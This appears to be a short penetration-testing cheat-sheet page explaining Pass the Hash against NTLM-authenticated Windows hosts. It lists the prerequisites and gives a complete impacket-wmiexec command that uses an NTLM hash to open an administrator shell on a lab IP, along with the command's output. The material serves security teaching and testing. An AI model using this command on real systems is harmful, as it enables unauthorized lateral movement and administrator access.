---
description: >-
  Pass The Hash allows an attacker to authenticate with an NTLM hash instead of
  using the plaintext password of a user.
---

# Pass The Hash



## Prerequisites

<mark style="color:red;">**NOTE:**</mark> this will not work for Kerberos authentication but only for servers or services using NTLM authentication

* Requires the admin share called **ADMIN$** to be available.
* Requires an SMB connection through the firewall (port 445)

## Lateral Movement - Impacket

```shell-session
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```
